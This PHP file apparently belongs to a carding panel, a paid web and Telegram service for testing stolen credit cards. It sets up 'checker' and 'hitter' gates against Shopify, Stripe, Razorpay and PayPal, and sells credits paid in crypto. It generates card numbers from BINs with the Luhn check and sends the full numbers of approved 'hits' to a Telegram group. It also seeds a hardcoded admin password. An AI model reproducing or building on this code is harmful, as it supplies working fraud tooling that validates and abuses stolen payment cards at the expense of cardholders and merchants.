<?php
session_start();

// Error reporting
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);

// Timezone
date_default_timezone_set('UTC');

// Database path
define('DB_PATH', __DIR__ . '/../database.db');

// Create database connection with WAL mode for better concurrency
function getDB() {
    try {
        $pdo = new PDO('sqlite:' . DB_PATH);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        // Enable WAL mode for better concurrency and prevent locking
        $pdo->exec("PRAGMA journal_mode = WAL");
        $pdo->exec("PRAGMA busy_timeout = 5000");
        $pdo->exec("PRAGMA synchronous = NORMAL");
        $pdo->exec("PRAGMA foreign_keys = ON");
        return $pdo;
    } catch(PDOException $e) {
        error_log("Database connection failed: " . $e->getMessage());
        return null;
    }
}

// Initialize database tables
function initDatabase() {
    $pdo = getDB();
    if (!$pdo) return;
    
    // Users table
    $pdo->exec("CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        email TEXT,
        credits REAL DEFAULT 0,
        is_admin INTEGER DEFAULT 0,
        is_owner INTEGER DEFAULT 0,
        banned INTEGER DEFAULT 0,
        api_key TEXT UNIQUE,
        display_name TEXT,
        telegram_id INTEGER,
        telegram_username TEXT,
        photo_url TEXT,
        plan TEXT DEFAULT 'Basic',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        last_login DATETIME
    )");
    
    // Settings table
    $pdo->exec("CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT NOT NULL,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
    
    // Gates table
    $pdo->exec("CREATE TABLE IF NOT EXISTS gates (
        key TEXT PRIMARY KEY,
        label TEXT NOT NULL,
        enabled INTEGER DEFAULT 1,
        type TEXT,
        file TEXT,
        credit_cost INTEGER DEFAULT 1,
        required_plan TEXT DEFAULT 'basic',
        description TEXT
    )");
    
    // Topup requests table
    $pdo->exec("CREATE TABLE IF NOT EXISTS topup_requests (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        username TEXT,
        amount REAL,
        credits INTEGER,
        tx_hash TEXT,
        status TEXT DEFAULT 'pending',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        reviewed_at DATETIME,
        reviewed_by TEXT
    )");
    
    // Credit history table
    $pdo->exec("CREATE TABLE IF NOT EXISTS credit_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        amount REAL,
        reason TEXT,
        card_info TEXT,
        balance REAL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
    
    // API keys table
    $pdo->exec("CREATE TABLE IF NOT EXISTS api_keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        key TEXT UNIQUE NOT NULL,
        user_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
    
    // Adverts table
    $pdo->exec("CREATE TABLE IF NOT EXISTS adverts (
        id TEXT PRIMARY KEY,
        title TEXT NOT NULL,
        content TEXT,
        image_url TEXT,
        link_url TEXT,
        position TEXT DEFAULT 'home',
        is_active INTEGER DEFAULT 1,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
    
    // Online users table
    $pdo->exec("CREATE TABLE IF NOT EXISTS online_users (
        session_id TEXT PRIMARY KEY,
        user_id INTEGER,
        username TEXT,
        display_name TEXT,
        photo_url TEXT,
        last_activity DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
    
    // Ingroup config table
    $pdo->exec("CREATE TABLE IF NOT EXISTS ingroup_config (
        id INTEGER PRIMARY KEY DEFAULT 1,
        bot_token TEXT,
        is_active INTEGER DEFAULT 0,
        rate_limit_per_user INTEGER DEFAULT 10,
        mass_max_cards INTEGER DEFAULT 25,
        premium_only_mass INTEGER DEFAULT 1,
        buy_message TEXT,
        admin_telegram_ids TEXT,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
    
    // Ingroup gates table
    $pdo->exec("CREATE TABLE IF NOT EXISTS ingroup_gates (
        id TEXT PRIMARY KEY,
        gate_key TEXT UNIQUE NOT NULL,
        display_name TEXT NOT NULL,
        command TEXT NOT NULL,
        mass_command TEXT NOT NULL,
        is_enabled INTEGER DEFAULT 1,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
    
    // Ingroup groups table
    $pdo->exec("CREATE TABLE IF NOT EXISTS ingroup_groups (
        id TEXT PRIMARY KEY,
        group_id TEXT UNIQUE NOT NULL,
        group_name TEXT,
        is_active INTEGER DEFAULT 1,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
    
    // Check if admin user exists
    $stmt = $pdo->prepare("SELECT COUNT(*) FROM users WHERE username = 'admin'");
    $stmt->execute();
    if ($stmt->fetchColumn() == 0) {
        $apiKey = 'cxchk_' . bin2hex(random_bytes(32));
        $stmt = $pdo->prepare("INSERT INTO users (username, password_hash, is_admin, is_owner, credits, api_key, display_name, plan) 
                               VALUES (?, ?, 1, 1, 999999, ?, 'Administrator', 'lifetime')");
        $stmt->execute(['admin', password_hash('admin123', PASSWORD_DEFAULT), $apiKey]);
    }
    
    // Insert default settings
    $defaultSettings = [
        'binance_wallet' => '',
        'binance_network' => 'BEP20',
        'credits_per_usdt' => '100',
        'default_credits' => '100',
        'daily_rate_limit' => '500',
        'daily_credit_reset' => '100',
        'site_announcement' => '',
        'telegram_bot_token' => '',
        'telegram_group_id' => '',
        'telegram_hits_enabled' => 'false',
        'telegram_bot_username' => '',
        'maintenance_mode' => 'false'
    ];
    foreach ($defaultSettings as $key => $value) {
        $stmt = $pdo->prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)");
        $stmt->execute([$key, $value]);
    }
    
    // Insert default gates
    $defaultGates = [
        'shopify' => ['label' => 'Shopify Checker', 'type' => 'auto_checker', 'file' => 'gate/shopify.php', 'credit_cost' => 4],
        'stripe_auth' => ['label' => 'Stripe Auth', 'type' => 'auto_checker', 'file' => 'gate/stripe_auth.php', 'credit_cost' => 3],
        'razorpay' => ['label' => 'Razorpay', 'type' => 'auto_checker', 'file' => 'gate/razorpay.php', 'credit_cost' => 3],
        'auth' => ['label' => 'Auth Checker', 'type' => 'checker', 'file' => 'gate/auth_checker.php', 'credit_cost' => 2],
        'charge' => ['label' => 'Charge Checker', 'type' => 'checker', 'file' => 'gate/charge_checker.php', 'credit_cost' => 3],
        'auth_charge' => ['label' => 'Auth+Charge', 'type' => 'checker', 'file' => 'gate/auth_charge.php', 'credit_cost' => 4],
        'stripe_checkout' => ['label' => 'Stripe Checkout', 'type' => 'hitter', 'file' => 'gate/stripe_checkout.php', 'credit_cost' => 5],
        'stripe_invoice' => ['label' => 'Stripe Invoice', 'type' => 'hitter', 'file' => 'gate/stripe_invoice.php', 'credit_cost' => 5],
        'stripe_inbuilt' => ['label' => 'Stripe Inbuilt', 'type' => 'hitter', 'file' => 'gate/stripe_inbuilt.php', 'credit_cost' => 5],
        'vbv' => ['label' => 'VBV Checker', 'type' => 'tool', 'file' => 'gate/vbv_checker.php', 'credit_cost' => 1]
    ];
    foreach ($defaultGates as $key => $gate) {
        $stmt = $pdo->prepare("INSERT OR IGNORE INTO gates (key, label, type, file, credit_cost) VALUES (?, ?, ?, ?, ?)");
        $stmt->execute([$key, $gate['label'], $gate['type'], $gate['file'], $gate['credit_cost']]);
    }
    
    // Insert default ingroup gates
    $defaultIngroupGates = [
        ['id' => '1', 'gate_key' => 'shopify', 'display_name' => 'Shopify Checker', 'command' => '/sh', 'mass_command' => '/msh', 'is_enabled' => 1],
        ['id' => '2', 'gate_key' => 'stripe', 'display_name' => 'Stripe Checker', 'command' => '/st', 'mass_command' => '/mst', 'is_enabled' => 1],
        ['id' => '3', 'gate_key' => 'paypal', 'display_name' => 'PayPal Checker', 'command' => '/pp', 'mass_command' => '/mpp', 'is_enabled' => 1],
        ['id' => '4', 'gate_key' => 'auth', 'display_name' => 'Auth Checker', 'command' => '/auth', 'mass_command' => '/mauth', 'is_enabled' => 1],
        ['id' => '5', 'gate_key' => 'charge', 'display_name' => 'Charge Checker', 'command' => '/ch', 'mass_command' => '/mch', 'is_enabled' => 1],
        ['id' => '6', 'gate_key' => 'vbv', 'display_name' => 'VBV Checker', 'command' => '/vbv', 'mass_command' => '/mvbv', 'is_enabled' => 1],
    ];
    foreach ($defaultIngroupGates as $gate) {
        $stmt = $pdo->prepare("INSERT OR IGNORE INTO ingroup_gates (id, gate_key, display_name, command, mass_command, is_enabled) VALUES (?, ?, ?, ?, ?, ?)");
        $stmt->execute([$gate['id'], $gate['gate_key'], $gate['display_name'], $gate['command'], $gate['mass_command'], $gate['is_enabled']]);
    }
    
    // Insert default ingroup config
    $stmt = $pdo->prepare("INSERT OR IGNORE INTO ingroup_config (id, bot_token, is_active, rate_limit_per_user, mass_max_cards, premium_only_mass, buy_message, admin_telegram_ids) 
                           VALUES (1, '', 0, 10, 25, 1, '⚠️ You have reached your daily limit. Upgrade to premium for unlimited checks!', '')");
    $stmt->execute();
}

// ============================================
// LOAD FUNCTIONS
// ============================================

function loadSettings() {
    $pdo = getDB();
    if (!$pdo) return [];
    $stmt = $pdo->query("SELECT key, value FROM settings");
    $settings = [];
    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        $settings[$row['key']] = $row['value'];
    }
    return $settings;
}

function saveSettings($settings) {
    $pdo = getDB();
    if (!$pdo) return;
    foreach ($settings as $key => $value) {
        if (is_array($value)) {
            $value = json_encode($value);
        }
        $stmt = $pdo->prepare("INSERT OR REPLACE INTO settings (key, value, updated_at) VALUES (?, ?, CURRENT_TIMESTAMP)");
        $stmt->execute([$key, $value]);
    }
}

function loadUsers() {
    $pdo = getDB();
    if (!$pdo) return [];
    $stmt = $pdo->query("SELECT * FROM users");
    $users = [];
    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        $users[$row['username']] = $row;
    }
    return $users;
}

function saveUsers($users) {
    $pdo = getDB();
    if (!$pdo) return;
    foreach ($users as $username => $user) {
        $stmt = $pdo->prepare("UPDATE users SET credits = ?, is_admin = ?, banned = ?, display_name = ?, api_key = ?, plan = ? WHERE username = ?");
        $stmt->execute([
            $user['credits'] ?? 0,
            $user['is_admin'] ?? 0,
            $user['banned'] ?? 0,
            $user['display_name'] ?? $username,
            $user['api_key'] ?? '',
            $user['plan'] ?? 'basic',
            $username
        ]);
    }
}

function loadGates() {
    $pdo = getDB();
    if (!$pdo) return [];
    $stmt = $pdo->query("SELECT * FROM gates");
    $gates = [];
    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        $gates[$row['key']] = [
            'label' => $row['label'],
            'enabled' => (bool)$row['enabled'],
            'type' => $row['type'],
            'file' => $row['file'],
            'credit_cost' => $row['credit_cost'],
            'required_plan' => $row['required_plan'] ?? 'basic',
            'description' => $row['description'] ?? ''
        ];
    }
    return $gates;
}

function saveGates($gates) {
    $pdo = getDB();
    if (!$pdo) return;
    foreach ($gates as $key => $gate) {
        $stmt = $pdo->prepare("UPDATE gates SET enabled = ?, required_plan = ? WHERE key = ?");
        $stmt->execute([$gate['enabled'] ? 1 : 0, $gate['required_plan'] ?? 'basic', $key]);
    }
}

function loadTopups() {
    $pdo = getDB();
    if (!$pdo) return [];
    $stmt = $pdo->query("SELECT * FROM topup_requests ORDER BY created_at DESC");
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function saveTopups($topups) {
    $pdo = getDB();
    if (!$pdo) return;
    foreach ($topups as $topup) {
        $stmt = $pdo->prepare("INSERT OR REPLACE INTO topup_requests (id, user_id, username, amount, credits, tx_hash, status, reviewed_at, reviewed_by) 
                               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");
        $stmt->execute([
            $topup['id'], $topup['user_id'] ?? null, $topup['username'], $topup['amount'],
            $topup['credits'], $topup['tx_hash'], $topup['status'], $topup['reviewed_at'] ?? null,
            $topup['reviewed_by'] ?? null
        ]);
    }
}

function loadCreditHistory() {
    $pdo = getDB();
    if (!$pdo) return [];
    $stmt = $pdo->query("SELECT * FROM credit_history ORDER BY created_at DESC");
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function saveCreditHistory($history) {
    $pdo = getDB();
    if (!$pdo) return;
    foreach ($history as $entry) {
        $stmt = $pdo->prepare("INSERT INTO credit_history (user_id, username, amount, reason, card_info, balance) 
                               VALUES (?, ?, ?, ?, ?, ?)");
        $stmt->execute([
            $entry['user_id'] ?? null, $entry['username'], $entry['amount'],
            $entry['reason'], $entry['card_info'] ?? null, $entry['balance'] ?? null
        ]);
    }
}

function loadApiKeys() {
    $pdo = getDB();
    if (!$pdo) return [];
    $stmt = $pdo->query("SELECT key FROM api_keys");
    return $stmt->fetchAll(PDO::FETCH_COLUMN);
}

function saveApiKeys($keys) {
    $pdo = getDB();
    if (!$pdo) return;
    $pdo->exec("DELETE FROM api_keys");
    foreach ($keys as $key) {
        $stmt = $pdo->prepare("INSERT INTO api_keys (key) VALUES (?)");
        $stmt->execute([$key]);
    }
}

function loadAdverts() {
    $pdo = getDB();
    if (!$pdo) return [];
    $stmt = $pdo->query("SELECT * FROM adverts ORDER BY created_at DESC");
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function saveAdverts($adverts) {
    $pdo = getDB();
    if (!$pdo) return;
    foreach ($adverts as $ad) {
        $stmt = $pdo->prepare("INSERT OR REPLACE INTO adverts (id, title, content, image_url, link_url, position, is_active, created_at) 
                               VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
        $stmt->execute([
            $ad['id'], $ad['title'], $ad['content'] ?? '', $ad['image_url'] ?? '',
            $ad['link_url'] ?? '', $ad['position'], $ad['is_active'] ? 1 : 0, $ad['created_at']
        ]);
    }
}

function loadOnlineUsers() {
    $pdo = getDB();
    if (!$pdo) return [];
    $stmt = $pdo->query("SELECT * FROM online_users WHERE last_activity > datetime('now', '-30 seconds')");
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function saveOnlineUsers($users) {
    $pdo = getDB();
    if (!$pdo) return;
    foreach ($users as $sessionId => $data) {
        $stmt = $pdo->prepare("INSERT OR REPLACE INTO online_users (session_id, user_id, username, display_name, photo_url, last_activity) 
                               VALUES (?, ?, ?, ?, ?, ?)");
        $stmt->execute([
            $sessionId, $data['user_id'] ?? null, $data['username'] ?? '', $data['display_name'] ?? '',
            $data['photo_url'] ?? '', $data['last_activity']
        ]);
    }
}

function loadIngroupConfig() {
    $pdo = getDB();
    if (!$pdo) return [];
    $stmt = $pdo->query("SELECT * FROM ingroup_config WHERE id = 1");
    $result = $stmt->fetch(PDO::FETCH_ASSOC);
    if (!$result) {
        $default = [
            'bot_token' => '',
            'is_active' => 0,
            'rate_limit_per_user' => 10,
            'mass_max_cards' => 25,
            'premium_only_mass' => 1,
            'buy_message' => '⚠️ You have reached your daily limit. Upgrade to premium for unlimited checks!',
            'admin_telegram_ids' => ''
        ];
        $stmt = $pdo->prepare("INSERT INTO ingroup_config (bot_token, is_active, rate_limit_per_user, mass_max_cards, premium_only_mass, buy_message, admin_telegram_ids) 
                               VALUES (?, ?, ?, ?, ?, ?, ?)");
        $stmt->execute([$default['bot_token'], $default['is_active'], $default['rate_limit_per_user'], $default['mass_max_cards'], $default['premium_only_mass'], $default['buy_message'], $default['admin_telegram_ids']]);
        return $default;
    }
    return $result;
}

function saveIngroupConfig($config) {
    $pdo = getDB();
    if (!$pdo) return;
    $stmt = $pdo->prepare("UPDATE ingroup_config SET bot_token = ?, is_active = ?, rate_limit_per_user = ?, mass_max_cards = ?, premium_only_mass = ?, buy_message = ?, admin_telegram_ids = ?, updated_at = CURRENT_TIMESTAMP WHERE id = 1");
    $stmt->execute([$config['bot_token'], $config['is_active'] ? 1 : 0, $config['rate_limit_per_user'], $config['mass_max_cards'], $config['premium_only_mass'] ? 1 : 0, $config['buy_message'], $config['admin_telegram_ids']]);
}

function loadIngroupGates() {
    $pdo = getDB();
    if (!$pdo) return [];
    $stmt = $pdo->query("SELECT * FROM ingroup_gates ORDER BY created_at");
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function saveIngroupGates($gates) {
    $pdo = getDB();
    if (!$pdo) return;
    foreach ($gates as $gate) {
        $stmt = $pdo->prepare("UPDATE ingroup_gates SET is_enabled = ? WHERE gate_key = ?");
        $stmt->execute([$gate['is_enabled'] ? 1 : 0, $gate['gate_key']]);
    }
}

function loadIngroupGroups() {
    $pdo = getDB();
    if (!$pdo) return [];
    $stmt = $pdo->query("SELECT * FROM ingroup_groups ORDER BY created_at");
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function saveIngroupGroups($groups) {
    $pdo = getDB();
    if (!$pdo) return;
    $pdo->exec("DELETE FROM ingroup_groups");
    foreach ($groups as $group) {
        $stmt = $pdo->prepare("INSERT INTO ingroup_groups (id, group_id, group_name, is_active, created_at) VALUES (?, ?, ?, ?, ?)");
        $stmt->execute([$group['id'], $group['group_id'], $group['group_name'], $group['is_active'] ? 1 : 0, $group['created_at']]);
    }
}

// ============================================
// AUTHENTICATION FUNCTIONS
// ============================================

function generateApiKey() {
    return 'cxchk_' . bin2hex(random_bytes(32));
}

function isLoggedIn() {
    return isset($_SESSION['user']) && !empty($_SESSION['user']);
}

function isAdmin() {
    return isset($_SESSION['user']['is_admin']) && $_SESSION['user']['is_admin'] === true;
}

function isOwner() {
    return isset($_SESSION['user']['is_owner']) && $_SESSION['user']['is_owner'] === true;
}

function isBanned() {
    return isset($_SESSION['user']['banned']) && $_SESSION['user']['banned'] === true;
}

function getUserCredits() {
    return $_SESSION['user']['credits'] ?? 0;
}

function addCredits($username, $amount, $reason) {
    $pdo = getDB();
    if (!$pdo) return false;
    
    $stmt = $pdo->prepare("UPDATE users SET credits = credits + ? WHERE username = ?");
    $stmt->execute([$amount, $username]);
    
    $stmt = $pdo->prepare("SELECT id, credits FROM users WHERE username = ?");
    $stmt->execute([$username]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if ($user) {
        $stmt = $pdo->prepare("INSERT INTO credit_history (user_id, username, amount, reason, balance) VALUES (?, ?, ?, ?, ?)");
        $stmt->execute([$user["id"], $username, $amount, $reason, $user["credits"]]);
        if (isset($_SESSION["user"]["name"])) {
            $_SESSION["user"]["credits"] = $user["credits"];
        }
        return true;
    }
    return false;

}

function deductCredits($amount, $reason, $cardInfo = '') {
    if (!isset($_SESSION['user'])) return false;
    
    $pdo = getDB();
    if (!$pdo) return false;
    
    $username = $_SESSION['user']['name'] ?? '';
    
    $stmt = $pdo->prepare("SELECT id, credits FROM users WHERE username = ?");
    $stmt->execute([$username]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if (!$user || $user['credits'] < $amount) return false;
    
    $newCredits = $user['credits'] - $amount;
    $stmt = $pdo->prepare("UPDATE users SET credits = ? WHERE username = ?");
    $stmt->execute([$newCredits, $username]);
    
    $stmt = $pdo->prepare("INSERT INTO credit_history (user_id, username, amount, reason, card_info, balance) VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->execute([$user['id'], $username, -$amount, $reason, $cardInfo, $newCredits]);
    
    $_SESSION['user']['credits'] = $newCredits;
    return true;
}

function getUserStats($username) {
    $pdo = getDB();
    if (!$pdo) return ['total_checks' => 0, 'approved_checks' => 0, 'success_rate' => 0, 'credits_used' => 0];
    
    $stmt = $pdo->prepare("SELECT COUNT(*) as total, 
                                  SUM(CASE WHEN reason LIKE '%approved%' OR reason LIKE '%charged%' THEN 1 ELSE 0 END) as approved 
                           FROM credit_history WHERE username = ?");
    $stmt->execute([$username]);
    $result = $stmt->fetch(PDO::FETCH_ASSOC);
    
    $total = $result['total'] ?? 0;
    $approved = $result['approved'] ?? 0;
    
    return [
        'total_checks' => $total,
        'approved_checks' => $approved,
        'success_rate' => $total > 0 ? round(($approved / $total) * 100) : 0,
        'credits_used' => 0
    ];
}

function getOnlineUsers() {
    $pdo = getDB();
    if (!$pdo) return [];
    
    $stmt = $pdo->query("SELECT * FROM online_users WHERE last_activity > datetime('now', '-30 seconds')");
    $users = [];
    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        $users[] = [
            'name' => $row['display_name'] ?: $row['username'],
            'username' => $row['username'] ? '@' . $row['username'] : null,
            'photo_url' => $row['photo_url'] ?? 'https://ui-avatars.com/api/?name=' . urlencode(substr($row['display_name'] ?: $row['username'], 0, 1)) . '&background=8b5cf6&color=fff&size=64',
            'is_online' => true
        ];
    }
    return $users;
}

function updateOnlineStatus($username) {
    $pdo = getDB();
    if (!$pdo) return;
    
    $stmt = $pdo->prepare("SELECT id, display_name, username, photo_url FROM users WHERE username = ?");
    $stmt->execute([$username]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if ($user) {
        $sessionId = session_id();
        $stmt = $pdo->prepare("INSERT OR REPLACE INTO online_users (session_id, user_id, username, display_name, photo_url, last_activity) 
                               VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)");
        $stmt->execute([$sessionId, $user['id'], $user['username'], $user['display_name'], $user['photo_url']]);
    }
    
    $pdo->exec("DELETE FROM online_users WHERE last_activity < datetime('now', '-30 seconds')");
}

function authenticateUser($username, $password) {
    $pdo = getDB();
    if (!$pdo) return false;
    
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->execute([$username]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if (!$user) return false;
    if (!password_verify($password, $user['password_hash'])) return false;
    if ($user['banned']) return false;
    
    $_SESSION['user'] = [
        'name' => $user['username'],
        'credits' => $user['credits'],
        'is_admin' => (bool)$user['is_admin'],
        'is_owner' => (bool)$user['is_owner'],
        'banned' => (bool)$user['banned'],
        'username' => $user['username'],
        'display_name' => $user['display_name'] ?? $user['username'],
        'api_key' => $user['api_key'],
        'plan' => $user['plan'] ?? 'basic',
        'created_at' => $user['created_at'],
        'user_id' => $user['id']
    ];
    
    updateOnlineStatus($user['username']);
    return true;
}

function registerUser($username, $password, $email = null) {
    $pdo = getDB();
    if (!$pdo) return ['success' => false, 'error' => 'Database error'];
    
    $stmt = $pdo->prepare("SELECT COUNT(*) FROM users WHERE username = ?");
    $stmt->execute([$username]);
    if ($stmt->fetchColumn() > 0) {
        return ['success' => false, 'error' => 'Username already exists'];
    }
    
    if (!preg_match('/^[A-Za-z0-9_]{3,32}$/', $username)) {
        return ['success' => false, 'error' => 'Username must be 3-32 characters'];
    }
    if (strlen($password) < 6) {
        return ['success' => false, 'error' => 'Password must be at least 6 characters'];
    }
    
    $settings = loadSettings();
    $apiKey = generateApiKey();
    
    $stmt = $pdo->prepare("INSERT INTO users (username, password_hash, credits, api_key, display_name, email, plan) 
                           VALUES (?, ?, ?, ?, ?, ?, 'basic')");
    $stmt->execute([$username, password_hash($password, PASSWORD_DEFAULT), $settings['default_credits'], $apiKey, $username, $email]);
    
    return ['success' => true];
}

// ============================================
// GATEWAY & UTILITY FUNCTIONS
// ============================================

function processGateway($gateway, $card) {
    $gates = loadGates();
    if (!isset($gates[$gateway])) {
        return ['status' => 'ERROR', 'message' => 'Gateway not found'];
    }
    $gate = $gates[$gateway];
    if (!$gate['enabled']) {
        return ['status' => 'ERROR', 'message' => 'Gateway disabled'];
    }
    
    $gateFile = __DIR__ . '/../' . $gate['file'];
    if (!file_exists($gateFile)) {
        return ['status' => 'ERROR', 'message' => 'Gateway file not found'];
    }
    
    if (!deductCredits($gate['credit_cost'], $gate['label'] . ' check', substr($card, 0, 6) . '****')) {
        return ['status' => 'ERROR', 'message' => 'Insufficient credits'];
    }
    
    ob_start();
    $_POST = ['cc' => $card];
    include $gateFile;
    $output = ob_get_clean();
    
    $status = 'DECLINED';
    $message = $output;
    $outputUpper = strtoupper($output);
    
    if (strpos($outputUpper, 'CHARGED') !== false) {
        $status = 'CHARGED';
        $message = 'Card charged successfully';
    } elseif (strpos($outputUpper, 'APPROVED') !== false || strpos($outputUpper, 'LIVE') !== false) {
        $status = 'APPROVED';
        $message = 'Card approved';
    } elseif (strpos($outputUpper, '3DS') !== false) {
        $status = '3DS';
        $message = '3D Secure required';
    }
    
    if ($status === 'CHARGED' || $status === 'APPROVED') {
        sendTelegramHit($card, $gate['label'], $status, $_SESSION['user']['name'] ?? '' ?? null);
    }
    
    return ['status' => $status, 'message' => $message, 'raw' => $output];
}

function sendTelegramHit($card, $gate, $status, $username = null) {
    $settings = loadSettings();
    if ($settings['telegram_hits_enabled'] !== 'true') return false;
    if (empty($settings['telegram_bot_token']) || empty($settings['telegram_group_id'])) return false;
    
    $message = "✅ <b>APPROVED HIT</b>\n\n💳 <code>{$card}</code>\n🌐 <b>Gate:</b> {$gate}\n📊 <b>Status:</b> {$status}\n👤 <b>User:</b> @" . ($username ?? 'Unknown') . "\n⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . " UTC\n\n🔥 <b>APPROVED CHECKER</b>";
    
    $url = "https://api.telegram.org/bot" . $settings['telegram_bot_token'] . "/sendMessage";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['chat_id' => $settings['telegram_group_id'], 'text' => $message, 'parse_mode' => 'HTML']));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function sendTelegramMessage($chatId, $message, $parseMode = 'HTML') {
    $settings = loadSettings();
    if (empty($settings['telegram_bot_token'])) return false;
    
    $url = "https://api.telegram.org/bot" . $settings['telegram_bot_token'] . "/sendMessage";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['chat_id' => $chatId, 'text' => $message, 'parse_mode' => $parseMode]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function generateCards($bin, $month = 'rnd', $year = 'rnd', $cvv = 'rnd', $count = 10) {
    $bin = substr(preg_replace('/[^0-9]/', '', $bin), 0, 6);
    $cards = [];
    for ($i = 0; $i < $count; $i++) {
        $randomDigits = '';
        for ($j = 0; $j < 10; $j++) $randomDigits .= rand(0, 9);
        $cardNumber = luhnAlgorithm($bin . $randomDigits);
        $cardMonth = $month === 'rnd' ? str_pad(rand(1, 12), 2, '0', STR_PAD_LEFT) : str_pad($month, 2, '0', STR_PAD_LEFT);
        $cardYear = $year === 'rnd' ? str_pad(date('y') + rand(1, 5), 2, '0', STR_PAD_LEFT) : (strlen($year) === 2 ? $year : substr($year, -2));
        $cardCvv = $cvv === 'rnd' ? str_pad(rand(100, 999), 3, '0', STR_PAD_LEFT) : str_pad($cvv, 3, '0', STR_PAD_LEFT);
        $cards[] = "{$cardNumber}|{$cardMonth}|{$cardYear}|{$cardCvv}";
    }
    return $cards;
}

function luhnAlgorithm($number) {
    $number = substr($number, 0, 15);
    $sum = 0;
    $alternate = false;
    for ($i = strlen($number) - 1; $i >= 0; $i--) {
        $n = $number[$i];
        if ($alternate) {
            $n *= 2;
            if ($n > 9) $n = ($n % 10) + 1;
        }
        $sum += $n;
        $alternate = !$alternate;
    }
    $checkDigit = (10 - ($sum % 10)) % 10;
    return $number . $checkDigit;
}

function getBinInfo($bin) {
    $bin = substr(preg_replace('/[^0-9]/', '', $bin), 0, 6);
    $cacheFile = __DIR__ . '/../bin_cache/' . $bin . '.json';
    if (file_exists($cacheFile) && filemtime($cacheFile) > time() - 86400) {
        return json_decode(file_get_contents($cacheFile), true);
    }
    $response = @file_get_contents("https://bins.antipublic.cc/bins/{$bin}");
    if ($response) {
        $data = json_decode($response, true);
        if (!file_exists(__DIR__ . '/../bin_cache')) mkdir(__DIR__ . '/../bin_cache', 0755, true);
        file_put_contents($cacheFile, json_encode($data));
        return $data;
    }
    return null;
}

// Initialize database on load
initDatabase();

// Load global variables
$settings = loadSettings();
$gates = loadGates();

// Update online status if logged in
if (isLoggedIn() && !isBanned()) {
    updateOnlineStatus($_SESSION['user']['name'] ?? '');
}
?>